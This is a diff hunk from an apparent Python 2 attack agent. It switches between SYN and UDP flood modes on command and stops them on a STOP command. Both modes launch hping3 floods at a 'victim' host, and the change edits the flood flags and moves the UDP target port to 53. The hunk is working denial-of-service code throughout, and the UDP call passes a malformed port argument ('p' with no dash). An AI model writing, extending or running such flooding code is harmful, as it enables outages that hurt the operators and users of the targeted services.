@@ -45,11 +45,11 @@ if __name__=='__main__':
 				print 'Running a SYN attack...'
 				endProc(attack) # terminate previous
 				#attack = subprocess.Popen(["ping", '127.0.0.1'], stdout=sys.stdout)
-				attack = subprocess.Popen(["hping3","-S","--flood","-V", victim], stdout=subprocess.PIPE)
+				attack = subprocess.Popen(["hping3","-S","--flood", victim], stdout=subprocess.PIPE)
 			elif atkType == 'udp':
 				print 'Running a UDP attack...'
 				endProc(attack) # terminate previous
-				attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "420", victim], stdout=subprocess.PIPE)
+				attack = subprocess.Popen(["hping3", "--udp", "--flood", "p", "53", victim], stdout=subprocess.PIPE)
 		elif command == 'STOP':
 			endProc(attack)
 			print 'Attack stopped'
